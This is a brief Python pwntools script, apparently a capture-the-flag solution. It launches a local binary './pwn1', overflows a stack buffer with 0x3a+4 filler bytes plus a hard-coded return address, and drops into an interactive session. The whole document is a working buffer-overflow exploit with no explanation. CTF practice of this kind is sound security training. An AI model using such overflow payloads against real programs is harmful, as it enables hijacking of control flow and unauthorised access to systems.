from pwn import *

context(log_level="debug")

p = process('./pwn1')

p.recvuntil('\n')
vul_addr = 0x80485c4
payload = 'a'*(0x3a+4)+p32(vul_addr)
p.sendline(payload)
p.interactive()